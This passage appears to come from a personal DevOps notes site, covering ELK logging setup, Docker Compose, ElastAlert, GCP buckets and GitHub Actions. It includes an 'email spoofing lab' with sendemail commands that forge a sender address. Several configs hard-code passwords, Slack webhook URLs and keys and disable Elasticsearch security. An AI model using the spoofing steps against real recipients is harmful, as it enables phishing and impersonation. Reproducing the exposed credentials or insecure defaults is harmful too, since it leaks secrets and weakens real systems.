Kibana is the visualization tool tailored for ElasticSearch and used to monitor our final logs.</p> <p>Not very surprising, but here\u2019s the command to install Kibana:</p> <pre><code>$ sudo apt-get install kibana\n</code></pre> <p>As usual, start the service and verify that it is working properly.</p> <pre><code>$ sudo systemctl start kibana\n$ sudo lsof -i -P -n | grep LISTEN | grep 5601\nnode       7253          kibana   18u  IPv4 1159451844      0t0  TCP *:5601 (LISTEN)\n</code></pre> <p>Kibana Web UI is available on port 5601.</p> <p>Head over to http://localhost:5601 with your browser and you should see the following screen.</p> <p></p> <p>Nice!</p> <p>We are now very ready to ingest logs from rsyslog and to start visualizing them in Kibana.</p>"},{"location":"Elastic/RsyslogKibana/#v-routing-linux-logs-to-elasticsearch","title":"V \u2013 Routing Linux Logs to ElasticSearch","text":"<p>As a reminder, we are routing logs from rsyslog to Logstash and those logs will be transferred to ElasticSearch pretty much automatically.</p>"},{"location":"Elastic/RsyslogKibana/#a-routing-from-logstash-to-elasticsearch","title":"a \u2013 Routing from Logstash to ElasticSearch","text":"<p>Before routing logs from rsyslog to Logstash, it is very important that we setup log forwarding between Logstash and ElasticSearch.</p> <p>To do so, we are going to create a configuration file for Logstash and tell it exactly what to do.</p> <p>To create Logstash configuration files, head over to /etc/logstash/conf.d and create a logstash.conf file.</p> <p>Inside, append the following content:</p> <pre><code>input {                                                                                      \n  udp {                                                                                      \n    host =&gt; \"127.0.0.1\"                                                                      \n    port =&gt; 10514                                                                            \n    codec =&gt; \"json\"                                                                          \n    type =&gt; \"rsyslog\"                                                                        \n  }                                                                                          \n}                                                                                            \n\n\n# The Filter pipeline stays empty here, no formatting is done.                                                                                           filter { }                                                                                   \n\n\n# Every single log will be forwarded to ElasticSearch. If you are using another port, you should specify it here.                                                                                             \noutput {                                                                                     \n  if [type] == \"rsyslog\" {                                                                   \n    elasticsearch {                                                                          \n      hosts =&gt; [ \"127.0.0.1:9200\" ]                                                          \n    }                                                                                        \n  }                                                                                          \n}                                                                                            \n</code></pre> <p>Note : for this tutorial, we are using the UDP input for Logstash, but if you are looking for a more reliable way to transfer your logs, you should probably use the TCP input. The format is pretty much the same, just change the UDP line to TCP.</p> <p>Restart your Logstash service.</p> <pre><code>$ sudo systemctl restart logstash\n</code></pre> <p>To verify that everything is running correctly, issue the following command:</p> <pre><code>$ netstat -na | grep 10514\nudp        0      0 127.0.0.1:10514         0.0.0.0:*\n</code></pre> <p>Great!</p> <p>Logstash is now listening on port 10514.</p>"},{"location":"Elastic/RsyslogKibana/#b-routing-from-rsyslog-to-logstash","title":"b \u2013 Routing from rsyslog to Logstash","text":"<p>As described before, rsyslog has a set of different modules that allow it to transfer incoming logs to a wide set of destinations.</p> <p>Rsyslog has the capacity to transform logs using templates. This is exactly what we are looking for as ElasticSearch expects JSON as an input, and not syslog RFC 5424 strings.</p> <p>In order to forward logs in rsyslog, head over to /etc/rsyslog.d and create a new file named 70-output.conf</p> <p>Inside your file, write the following content:</p> <pre><code># This line sends all lines to defined IP address at port 10514\n# using the json-template format.\n\n*.*                         @127.0.0.1:10514;json-template\n</code></pre> <p>Now that you have log forwarding, create a 01-json-template.conf file in the same folder, and paste the following content:</p> <pre><code>template(name=\"json-template\"\n  type=\"list\") {\n    constant(value=\"{\")\n      constant(value=\"\\\"@timestamp\\\":\\\"\")     property(name=\"timereported\" dateFormat=\"rfc3339\")\n      constant(value=\"\\\",\\\"@version\\\":\\\"1\")\n      constant(value=\"\\\",\\\"message\\\":\\\"\")     property(name=\"msg\" format=\"json\")\n      constant(value=\"\\\",\\\"sysloghost\\\":\\\"\")  property(name=\"hostname\")\n      constant(value=\"\\\",\\\"severity\\\":\\\"\")    property(name=\"syslogseverity-text\")\n      constant(value=\"\\\",\\\"facility\\\":\\\"\")    property(name=\"syslogfacility-text\")\n      constant(value=\"\\\",\\\"programname\\\":\\\"\") property(name=\"programname\")\n      constant(value=\"\\\",\\\"procid\\\":\\\"\")      property(name=\"procid\")\n    constant(value=\"\\\"}\\n\")\n}\n</code></pre> <p>As you probably guessed it, for every incoming message, rsyslog will interpolate log properties into a JSON formatted message, and forward it to Logstash, listening on port 10514.</p> <p>Restart your rsyslog service, and verify that logs are correctly forwarded to ElasticSearch.</p> <p>Note : logs will be forwarded in an index called logstash-*.</p> <pre><code>$ sudo systemctl restart rsyslog\n$ curl -XGET 'http://localhost:9200/logstash-*/_search?q=*&amp;pretty'\n{\n  \"took\": 2,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\": 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\": {\n      \"value\": 10000,\n      \"relation\": \"gte\"\n    },\n    \"max_score\": 1,\n    \"hits\": [\n      {\n        \"_index\": \"logstash-2019.07.08-000001\",\n        \"_type\": \"_doc\",\n        \"_id\": \"GEBK1WsBQwXNQFYwP8D_\",\n        \"_score\": 1,\n        \"_source\": {\n          \"host\": \"127.0.0.1\",\n          \"severity\": \"info\",\n          \"programname\": \"memory_usage\",\n          \"facility\": \"user\",\n          \"@timestamp\": \"2019-07-09T05:52:21.402Z\",\n          \"sysloghost\": \"schkn-ubuntu\",\n          \"message\": \"                                  Dload  Upload   Total   Spent    Left  Speed\",\n          \"@version\": \"1\",\n          \"procid\": \"16780\",\n          \"type\": \"rsyslog\"\n        }\n      }\n    ]\n  }\n}                                                                                             \n</code></pre> <p>Awesome! We know have rsyslog logs directly stored in ElasticSearch.</p> <p>It is time for us to build our final dashboard in Kibana.</p>"},{"location":"Elastic/RsyslogKibana/#vi-building-a-log-dashboard-in-kibana","title":"VI \u2013 Building a Log Dashboard in Kibana","text":"<p>This is where the fun begins.</p> <p>We are going to build the dashboard shown in the first part and give meaning to the data we collected.</p> <p>Similarly to our article on Linux process monitoring, this part is split according to the different panels of the final dashboard, so feel free to jump to the section you are interested in.</p>"},{"location":"Elastic/RsyslogKibana/#a-a-few-words-on-kibana","title":"a \u2013 A Few Words On Kibana","text":"<p>Head over to Kibana (on http://localhost:5601), and you should see the following screen.</p> <p></p> <p>If it is your first time using Kibana, there is one little gotcha that I want to talk about that took me some time to understand.</p> <p>In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this, one called \u201cVisualize\u201d and another called \u201cDashboard\u201d</p> <p></p> <p>In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.</p> <p>When all of them will be created, you will import them one by one into your final dashboard.</p> <p></p> <p>Head over to the \u201cVisualize\u201d panel, and let\u2019s start with one first panel.</p>"},{"location":"Elastic/RsyslogKibana/#b-aggregated-bar-chart-for-processes","title":"b \u2013 Aggregated bar chart for processes","text":"<p>To build your first dashboard, click on \u201cCreate new visualization\u201d at the top right corner of Kibana. Choose a vertical bar panel.</p> <p></p> <p>The main goal is to build a panel that looks like this :</p> <p></p> <p>As you can see, the bar chart provides a total count of logs per processes, in an aggregated way.</p> <p>The bar chart can also be split by host if you are working with multiple hosts.</p> <p></p> <p>Without further ado, here\u2019s the cheatsheet for this panel.</p> <p></p>"},{"location":"Elastic/RsyslogKibana/#c-pie-by-program-name","title":"c \u2013 Pie by program name","text":"<p>Very similarly to what we have done before, the goal is to build a pie panel that divides the log proportions by program name.</p> <p></p> <p>Here the cheatsheet for this panel!</p> <p></p>"},{"location":"Elastic/RsyslogKibana/#d-pie-by-severity","title":"d \u2013 Pie by severity","text":"<p>This panel looks exactly like the one we did before, except that it splits logs by severity.</p> <p>It can be quite useful when you have a major outage on one of your systems, and you want to quickly see that the number of errors is increasing very fast.</p> <p>It also provides an easy way to see your log severity summary on a given period if you are interested for example in seeing what severities occur during the night or for particular events.</p> <p></p> <p>Again as you are probably waiting for it, here\u2019s the cheatsheet for this panel!</p> <p></p>"},{"location":"Elastic/RsyslogKibana/#e-monitoring-ssh-entries","title":"e \u2013 Monitoring SSH entries","text":"<p>This one is a little bit special, as you can directly go in the \u201cDiscover\u201d tab in order to build your panel.</p> <p>When entering the discover tab, your \u201clogstash-*\u201d should be automatically selected.</p> <p>From there, in the filter bar, type the following filter \u201cprogramname : ssh*\u201d.</p> <p>As you can see, you now have a direct access to every log related to the SSHd service on your machine. You can for example track illegal access attempts or wrong logins.</p> <p></p> <p>In order for it to be accessible in the dashboard panel, click on the \u201cSave\u201d option, and give a name to your panel.</p> <p>Now in the dashboard panel, you can click on \u201cAdd\u201d, and choose the panel you just created.</p> <p>Nice! Now your panel is included into your dashboard, from the discover panel.</p> <p></p>"},{"location":"Elastic/RsyslogKibana/#vi-conclusion","title":"VI \u2013 Conclusion","text":"<p>With this tutorial, you know have a better understanding of how you can monitor your entire logging infrastructure easily with Rsyslog and the ELK stack.</p> <p>With the architecture presented in this article, you can scale the log monitoring of an entire cluster very easily by forwarding logs to your central server.</p> <p>One advice would be to use a Docker image for your rsyslog and ELK stack in order to be able to scale your centralized part (with Kubernetes for example) if the number of logs increases too much.</p> <p>It is also important to note that this architecture is ideal if you choose to change the way your monitor logs in the future.</p> <p>You can still rely on rsyslog for log centralizing, but you are free to change either the gateway (Logstash in this case), or the visualization tool.</p> <p>It is important to note that you could use Grafana for example to monitor your Elasticsearch logs very easily.</p> <p>With this tutorial, will you start using this architecture in your own infrastructure?</p> <p>Do you think that other panels would be relevant for you to debug major outages on your systems?</p> <p>If you have ideas, make sure to leave them below, so that it can help other engineers.</p> <p>Until then, have fun, as always.</p> <p>ELASTICSEARCHKIBANA</p>"},{"location":"Elastic/composeElasKib/","title":"composeElasKib","text":"<pre><code>version: '3'\nservices:\n  elasticsearch:\n    container_name: elasticsearch\n    image: docker.elastic.co/elasticsearch/elasticsearch:8.7.1\n    # 8.x\n    environment: ['CLI_JAVA_OPTS=-Xms2g -Xmx2g','bootstrap.memory_lock=true','discovery.type=single-node','xpack.security.enabled=false', 'xpack.security.enrollment.enabled=false']\n    ports:\n      - 9200:9200\n    networks:\n      - elastic\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n      nofile:\n        soft: 65536\n        hard: 65536\n    deploy:    \n      resources:\n          limits:\n            cpus: '2.0'\n          reservations:\n            cpus: '1.0'\n\n  kibana:\n    image: docker.elastic.co/kibana/kibana:8.7.1\n    container_name: kibana\n    environment:\n      XPACK_ENCRYPTEDSAVEDOBJECTS_ENCRYPTIONKEY: d1a66dfd-c4d3-4a0a-8290-2abcb83ab3aa\n    ports:\n      - 5601:5601\n    networks:\n      - elastic\n    deploy:    \n      resources:\n          limits:\n            cpus: '2.0'\n          reservations:\n            cpus: '1.0'\n\nnetworks:\n  elastic:\n</code></pre> <pre><code>docker run -d -p 9200:9200 -p 5601:5601 -e SSL_MODE=false nshou/elasticsearch-kibana\n</code></pre>"},{"location":"Elastic/dumpElastic/","title":"dumpElastic","text":""},{"location":"Elastic/dumpElastic/#elastic-dump-in-docker","title":"Elastic Dump in Docker","text":"<pre><code>docker run --rm -ti elasticdump/elasticsearch-dump \\\n    --input=http://&lt;user&gt;:&lt;password&gt;@34.69.228.174:419/logs \\  \n    --output=https://&lt;user&gt;:&lt;password&gt;@elastic.carti3r.tk/logs \\  \n    --type=data\n</code></pre>"},{"location":"Elastic/dumpElastic/#docker-install","title":"Docker install","text":"<p>If you prefer using docker to use elasticdump, you can download this project from docker hub:</p> <pre><code>docker pull elasticdump/elasticsearch-dump\n</code></pre> <p>Then you can use it just by :</p> <ul> <li>using <code>docker run --rm -ti elasticdump/elasticsearch-dump</code></li> <li>you'll need to mount your file storage dir <code>-v &lt;your dumps dir&gt;:&lt;your mount point&gt;</code> to your docker container</li> </ul> <p>Example:</p> <pre><code># Copy an index from production to staging with mappings:\ndocker run --rm -ti elasticdump/elasticsearch-dump \\\n  --input=http://production.es.com:9200/my_index \\\n  --output=http://staging.es.com:9200/my_index \\\n  --type=mapping\ndocker run --rm -ti elasticdump/elasticsearch-dump \\\n  --input=http://production.es.com:9200/my_index \\\n  --output=http://staging.es.com:9200/my_index \\\n  --type=data\n\n# Backup index data to a file:\ndocker run --rm -ti -v /data:/tmp elasticdump/elasticsearch-dump \\\n  --input=http://production.es.com:9200/my_index \\\n  --output=/tmp/my_index_mapping.json \\\n  --type=data\n</code></pre> <p>If you need to run using <code>localhost</code> as your ES host:</p> <pre><code>docker run --net=host --rm -ti elasticdump/elasticsearch-dump \\\n  --input=http://staging.es.com:9200/my_index \\\n  --output=http://localhost:9200/my_index \\\n  --type=data\n</code></pre>"},{"location":"Elastic/dumpElastic/#dump-format","title":"Dump Format","text":"<p>The file format generated by this tool is line-delimited JSON files. The dump file itself is not valid JSON, but each line is. We do this so that dumpfiles can be streamed and appended without worrying about whole-file parser integrity.</p> <p>For example, if you wanted to parse every line, you could do:</p> <pre><code>while read LINE; do jsonlint-py \"${LINE}\" ; done &lt; dump.data.json\n</code></pre>"},{"location":"Elastic/metricbeats/","title":"MetricBeats Setup","text":""},{"location":"Elastic/metricbeats/#getting-started","title":"Getting Started","text":"<p>Step 11</p> <p>1. Download and install Metricbeat</p> <p>First time using Metricbeat? See the Quick Start.</p> <pre><code>1curl -L -O https://artifacts.elastic.co/downloads/beats/metricbeat/metricbeat-8.2.2-amd64.deb 2sudo dpkg -i metricbeat-8.2.2-amd64.deb \n</code></pre> <p>Step 22</p> <p>2. Edit the configuration</p> <p>Modify <code>/etc/metricbeat/metricbeat.yml</code> to set the connection information:</p> <pre><code>1output.elasticsearch: 2  hosts: [\"elastic.carti3r.tk\"] 3  username: \"&lt;username&gt;\" 4  password: \"&lt;password&gt;\" 5  # If using Elasticsearch's default certificate 6  # ssl.ca_trusted_fingerprint: \"&lt;es cert fingerprint&gt;\" 7setup.kibana: 8  host: \"kibana.carti3r.tk&gt;\" 9 \n</code></pre> <p>Where <code>&lt;password&gt;</code> is the password of the <code>elastic</code> user, <code>&lt;es_url&gt;</code> is the URL of Elasticsearch, and <code>&lt;kibana_url&gt;</code> is the URL of Kibana. To configure SSL with the default certificate generated by Elasticsearch, add its fingerprint in <code>&lt;es cert fingerprint&gt;</code>.</p> <p>Step 33</p> <p>3. Enable and configure the elasticsearch module</p> <pre><code>1sudo metricbeat modules enable elasticsearch\n</code></pre> <p>Modify the settings in the <code>/etc/metricbeat/modules.d/elasticsearch.yml</code> file.</p> <pre><code>1sudo metricbeat modules enable docker\n</code></pre> <p>Modify the settings in the <code>/etc/metricbeat/modules.d/docker.yml</code> file.</p> <pre><code>1metricbeat.modules: 2- module: docker 3  metricsets: 4    - \"container\" 5    - \"cpu\" 6    - \"diskio\" 7    - \"event\" 8    - \"healthcheck\" 9    - \"info\" 10    #- \"image\" 11    - \"memory\" 12    - \"network\" 13    #- \"network_summary\" 14  hosts: [\"unix:///var/run/docker.sock\"] 15  period: 10s 16  enabled: true \n</code></pre> <p>Step 44</p> <p>4. Start Metricbeat</p> <p>The <code>setup</code> command loads the Kibana dashboards. If the dashboards are already set up, omit this command.</p> <pre><code>1sudo metricbeat setup 2sudo service metricbeat start \n</code></pre> <p>A\u00f1adir etiqueta</p>"},{"location":"Elastic/elastalert%2Bconfig/docker-compose/","title":"Elastalert","text":"<pre><code>docker-compose.yml\nelastalert\n    \u251c\u2500\u2500 elastalert.yaml\n    \u2514\u2500\u2500 rules\n        \u251c\u2500\u2500 slack_error.yaml\n        \u2514\u2500\u2500 slack_info.yaml\n</code></pre> <pre><code>#docker-compose.yml\n  elastalert:\n      container_name: elastalert\n      restart: always\n      volumes:\n        - './elastalert/elastalert.yaml:/opt/elastalert/config.yaml'\n        - './elastalert/rules:/opt/elastalert/rules'\n      image: jertel/elastalert2\n      ports:\n        - 3030:3030\n</code></pre> <pre><code>#elastalert.yaml\nrules_folder: /opt/elastalert/rules\n\nrun_every:\n  seconds: 10\n\nbuffer_time:\n  minutes: 15\n\nes_host: elasticsearch\nes_port: 9200\nes_username: alg_kibana\nes_password: cartier419\n\nwriteback_index: elastalert_status\n\nalert_time_limit:\n  days: 2\n</code></pre> <pre><code>#slack_error.yaml\nname: info error\ntype: frequency\nindex: logs*\nnum_events: 3\ntimeframe:\n  hours: 1\nfilter:\n- terms:\n  #  host.name: \"b6f798466e9c\"\n    log.file.path.keyword: [\"/data/logs/be/error.log\", \"/data/error.log\"]\nalert:\n- \"slack\"\nslack:\nslack_webhook_url: 'https://hooks.slack.com/services/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'\nslack_emoji_override: \":warning:\"\nslack_msg_color: \"danger\"\n</code></pre> <pre><code>#slack_info.yml\nname: info warning\ntype: frequency\nindex: logs*\nnum_events: 3\ntimeframe:\n  hours: 1\nfilter:\n- terms:\n    #host.name: \"b6f798466e9c\"\n    log.file.path.keyword: [\"/data/logs/be/info.log\", \"/data/info.log\"]\nalert:\n- \"slack\"\nslack:\nslack_webhook_url: 'https://hooks.slack.com/services/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'\nslack_emoji_override: \":warning:\"\nslack_msg_color: \"warning\"\n</code></pre>"},{"location":"Email/spoofLab/","title":"Install spoof lab","text":""},{"location":"Email/spoofLab/#installing-postfix-and-sendemail","title":"Installing Postfix and SendEmail","text":"<p>We need to get the proper tools on our machine before we can do anything. In order to successfully complete an attack, we need to first host our own mail server or use a server which will provide one for us, such as smtp2go. For simplicity here, we will host our own server with Postfix. You can install it by running the following command as root:</p> <pre><code>apt install postfix\n</code></pre> <p>You can ignore any warnings about copying configuration files around. Next, we need to get sendemail, which is what we will use to send the actual fake E-Mail messages. Install it by running the following command as root:</p> <pre><code>apt install sendemail\n</code></pre>"},{"location":"Email/spoofLab/#step-2starting-the-mail-server","title":"Step 2Starting the Mail Server","text":"<p>After getting the proper tools, it's time for us to start our local mail server. Execute as root:</p> <pre><code>systemctl start postfix\n</code></pre> <p>This will start Postfix E-Mail server and have it listen on port 25 for connections. You can skip this step, if you are using an existing mail server.</p>"},{"location":"Email/spoofLab/#step-3sending-the-email","title":"Step 3Sending the Email","text":"<p>To craft the custom E-Mail, we will be using SendEmail - a lightweight, command line SMTP client, written by Brandon Zehm. We can do so with the following command:</p> <pre><code>sendemail -f a1ucard0@gmail.com -t dummymail31337@gmail.com -u \"A Real Email\" -m \"This is a very real email\"\n</code></pre> <p></p> <p>As you can see, the E-Mail was sent successfully and if I check my inbox...</p> <p></p> <p>You might have noticed that the E-Mail got delivered to my spam folder. This is because I am using my own mail server and so the message never gets encrypted or validated by Google or my ISP's mail server. This wouldn't be the case if I actually used an external mail server, such as the ones provided by smtp2go.</p> <p>Let's dissect the above command to learn what each of the arguments mean: -f - used to specify the sender's email address. Here you have to input the address you want to appear as. -t - used to specify the recipient's email address. -u - specifies the subject of the E-Mail. Note that this option is not required. -m - specifies the actual contents of the E-Mail.</p> <p>Some additional arguments you can use are: -a - followed by a filepath for attaching files.</p> <p>-o message-file=FILENAME - you can specify a file that contains the contents of the E-Mail, instead of manually typing them on the command line.</p> <p>-o message-header=\"Name:Value\" - here you can specify additional E-Mail headers such as the \"From:\" header which will change the name (but not the E-Mail address, that is done with -f) of the sender.</p> <p>-s SERVER:PORT - you can use this to specify the IP Address and port of the server you will be using. Defaults to localhost:25.</p>"},{"location":"Email/spoofLab/#step-4cleaning-up","title":"Step 4Cleaning Up","text":"<p>Don't forget to shut down the Postfix mail server: $ systemctl stop postfix</p>"},{"location":"Email/spoofLab/#conclusion","title":"Conclusion","text":"<p>Now you know just how easy it is to spoof E-Mail. You also surely realize what the consequences of such an attack might be!</p> <p>I have shown you this purely for educational purposes and I am not responsible for anything you do with that knowledge! Keep learning and see you soon!</p> <pre><code># reconfigure\n\ndpkg-reconfigure postfix\n</code></pre> <p>https://blog.spookysec.net//email-spoofing/</p> <p>https://github.com/pablokbs/peladonerd/issues/53</p> <pre><code>sendemail -f fromuser@gmail.com -t touser@domain.com -u subject -m \"message\" -s smtp.gmail.com:587 -o tls=yes -xu gmailaccount@gmail.com -xp gmailpassword \n</code></pre>"},{"location":"GCP/buckets/","title":"Buckets","text":""},{"location":"GCP/buckets/#docker-bucket-fuse","title":"Docker + Bucket + Fuse","text":"<p>DOCS:</p> <p>https://cloud.google.com/storage/docs/gcsfuse-quickstart-mount-bucket?hl=es-419</p> <p>Lo primero que necesitamos es contruir gcsfuse dentro de nuestra imagen para ello seguremos los pasos de este repositorio oficial de GCP.</p> <p>https://github.com/GoogleCloudPlatform/gcsfuse</p> <p>Agregaremos este stage a nuestro dockerfile adaptandolo para poder compilar y mover el binario dentro de nuestra imagen.</p> <pre><code># Build an alpine image with gcsfuse installed from the source code:\n#  &gt; docker build . -t gcsfuse\n# Mount the gcsfuse to /mnt/gcs:\n#  &gt; docker run --privileged --device /fuse -v /mnt/gcs:/gcs:rw,rshared gcsfuse\n\nFROM golang:1.20.4-alpine as builder\n\nRUN apk add git\n\nARG GCSFUSE_REPO=\"/run/gcsfuse/\"\nADD . ${GCSFUSE_REPO}\nWORKDIR ${GCSFUSE_REPO}\nRUN go install ./tools/build_gcsfuse\nRUN build_gcsfuse . /tmp $(git log -1 --format=format:\"%H\")\n\nFROM alpine:3.13\n\nRUN apk add --update --no-cache bash ca-certificates fuse\n\nCOPY --from=builder /tmp/bin/gcsfuse /usr/local/bin/gcsfuse\nCOPY --from=builder /tmp/sbin/mount.gcsfuse /usr/sbin/mount.gcsfuse\nENTRYPOINT [\"gcsfuse\", \"-o\", \"allow_other\", \"--foreground\", \"--implicit-dirs\", \"/gcs\"]\n</code></pre>"},{"location":"GCP/buckets/#install-gcp-sdk-intro-docker-optional","title":"Install GCP SDK intro docker (Optional)","text":"<pre><code>RUN curl -sSL https://sdk.cloud.google.com &gt; /tmp/gcl &amp;&amp; bash /tmp/gcl --install-dir=~/gcloud --disable-prompts\nENV PATH=$PATH:~/gcloud/google-cloud-sdk/bin\n</code></pre>"},{"location":"GCP/buckets/#define-docker-compose","title":"Define Docker Compose","text":"<p>When we mount GCP fuse into container we need to define the volume with the flag :shared</p> <pre><code>version: '3.1'\nservices:\n  db:\n    container_name: alg_postgres\n    image: postgres:14\n    restart: always\n    healthcheck:\n      test: [ \"CMD\", \"pg_isready\", \"-q\", \"-d\", \"postgres\", \"-U\", \"postgres\" ]\n      timeout: 45s\n      interval: 10s\n      retries: 10\n    ports:\n      - \"5432:5432\"\n    env_file:\n      - .env\n    volumes:\n      - db-postgres:/var/lib/postgresql/data\n\n  alg_backend:\n    container_name: alg_backend\n    user: root\n    image: registry.gitlab.com/cartier-lab/alg-backend:latest\n    restart: always\n    ports:\n      - \"3000:3000\"\n    env_file:\n      - .env\n    privileged: true\n    volumes:\n      - ${DATA_ROOT_PATH}:/data:shared \n\nvolumes:\n  db-postgres:\n  alg-backend:\n</code></pre>"},{"location":"GCP/buckets/#define-entrypoint","title":"Define entrypoint","text":"<p>To mount GCSfuse intro container when it starts, we need to define it into entrypoint script.</p> <pre><code>#!/bin/sh\nif [ \"$BUCKET_ENABLED\" = \"true\" ]; then\n    gcsfuse --key-file=/usr/auth/bucket.json $BUCKET_NAME /data\nfi\n\nnpm start\n</code></pre> <p></p>"},{"location":"Github/actionsCartier/","title":"actionsCartier","text":""},{"location":"Github/actionsCartier/#actions-example-cartier","title":"Actions Example Cartier","text":"<pre><code>name: Full_stage\n\non:\n  push:\n    branches:\n      - develop\n  pull_request:\n    branches:\n      - develop\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n\n    services:\n      postgres:\n        image: postgres:13\n        env:\n          PG_HOST: postgres\n          POSTGRES_DB: alg_database_test\n          POSTGRES_USER: ${{ secrets.POSTGRES_USER }}\n          POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }}\n          POSTGRES_HOST_AUTH_METHOD: trust\n        ports:\n          - 5432:5432\n        options: --name=postgres --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n      wg-easy:\n        image: weejewel/wg-easy:7\n        env:\n          WG_HOST: 0.0.0.0\n          PASSWORD: wireguard-test-network\n        ports:\n          - '51820:51820/udp'\n          - '51821:51821/tcp'\n        options: '--privileged'\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3.5.3\n      - name: Test user\n        run: |\n          sudo su - postgres\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE runner WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE root WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n      - name: Wait for PostgreSQL to be ready\n        run: |\n          until nc -zv localhost 5432; do\n            echo \"Waiting for PostgreSQL to be ready...\"\n            sleep 2\n          done\n\n      - name: Set up Node.js\n        uses: actions/setup-node@v3.8.1\n        with:\n          node-version: '18.16.0'\n\n      - name: Install dependencies and build\n        run: |\n          npm install --omit-dev\n          npm run build\n          cd public\n          npm install --omit-dev\n          npm run build\n        working-directory: ${{ github.workspace }}\n        # continue-on-error: true\n\n      - name: Test application\n        run: |\n          npm run autotest\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v3.1.2\n        with:\n          name: test-results\n          path: ${{ github.workspace }}/junit.xml\n\n  build-image:\n    runs-on: ubuntu-latest\n    needs: build_and_test\n    env:\n      CI_REGISTRY_IMAGE: registry.gitlab.com/cartier-lab/alg-backend\n    steps:\n      - name: Check Docker Info\n        run: docker info\n\n      - name: Docker Login\n        run: docker login registry.gitlab.com -u ${{ secrets.GITLAB_USER_REGISTRY }} -p ${{ secrets.GITLAB_USER_PWD }}\n\n      - name: Check Docker and Docker Compose Versions\n        run: |\n          docker --version\n          docker-compose version\n\n      - name: Checkout repository\n        uses: actions/checkout@v3\n\n      - name: Read alg version\n        id: read-image-version\n        run: echo \"image_version=$(cat changelog/version.md)_develop\" &gt;&gt; $GITHUB_OUTPUT\n\n      - name: Check version\n        run: |\n          echo ${{ steps.read-image-version.outputs.image_version }}\n\n      - name: 'base64'\n        run: |\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_RW  }}\" | base64 -d &gt; gcp_credentials-rw.json\n          echo -n \"${{ secrets.GCP_PRIVATE_KEY_R  }}\" | base64 -d &gt; gcp_credentials-r.json\n          echo -n \"${{ secrets.BUILD_ARGS  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_POSTGRES  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_ELASTIC  }}\" | base64 -d &gt;&gt; build.args\n          echo -n \"${{ secrets.BUILD_ARGS_API  }}\" | base64 -d &gt;&gt; build.args\n\n      - name: Build and Push Docker Image\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker build . --tag $CI_REGISTRY_IMAGE:latest --tag $CI_REGISTRY_IMAGE:$VERSION --tag $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA \\\n            $(out=\"\"; for i in $(cat build.args); do out=\"$out--build-arg $i \"; done; echo \"$out\"; out=\"\")\n          docker push $CI_REGISTRY_IMAGE:$VERSION\n          docker push $CI_REGISTRY_IMAGE:$VERSION_$GITHUB_SHA\n          docker push $CI_REGISTRY_IMAGE:latest\n\n      - name: Check Vars\n        run: |\n          export VERSION=${{ steps.read-image-version.outputs.image_version }}\n          docker run $CI_REGISTRY_IMAGE:$VERSION env\n</code></pre> <pre><code>name: Full_stage\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n\n    services:\n      postgres:\n        image: postgres:13\n        env:\n          PG_HOST: postgres\n          POSTGRES_DB: alg_database_test\n          POSTGRES_USER: ${{ secrets.POSTGRES_USER }}\n          POSTGRES_PASSWORD: ${{ secrets.POSTGRES_PASSWORD }}\n          POSTGRES_HOST_AUTH_METHOD: trust\n        ports:\n          - 5432:5432\n        options: --name=postgres --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n\n      wg-easy:\n        image: weejewel/wg-easy:7\n        env:\n          WG_HOST: 0.0.0.0\n          PASSWORD: wireguard-test-network\n        ports:\n          - '51820:51820/udp'\n          - '51821:51821/tcp'\n        options: '--privileged'\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3.5.3\n      - name: Test user\n        run: |\n          sudo su - postgres\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE runner WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n          PGPASSWORD=${{ secrets.POSTGRES_PASSWORD }} psql -h localhost -p 5432 -U ${{ secrets.POSTGRES_USER }} -c \"CREATE ROLE root WITH SUPERUSER CREATEDB CREATEROLE LOGIN ENCRYPTED PASSWORD '${{ secrets.POSTGRES_PASSWORD }}';\"\n      - name: Wait for PostgreSQL to be ready\n        run: |\n          until nc -zv localhost 5432; do\n            echo \"Waiting for PostgreSQL to be ready...\"\n            sleep 2\n          done\n\n      - name: Set up Node.js\n        uses: actions/setup-node@v3.8.1\n        with:\n          node-version: '18.16.0'\n\n      - name: Install dependencies and build\n        run: |\n          npm install --omit-dev\n          npm run build\n          cd public\n          npm install --omit-dev\n          npm run build\n        working-directory: ${{ github.workspace }}\n        # continue-on-error: true\n\n      - name: Test application\n        run: npm run autotest\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v3.1.2\n        with:\n          name: test-results\n          path: ${{ github.workspace }}/junit.xml\n\n  build-image:\n    runs-on: ubuntu-latest\n    needs: build_and_test\n    env:\n      CI_REGISTRY_IMAGE: registry.gitlab.com/cartier-lab/alg-backend\n    steps:\n      - name: Check Docker Info\n        run: docker 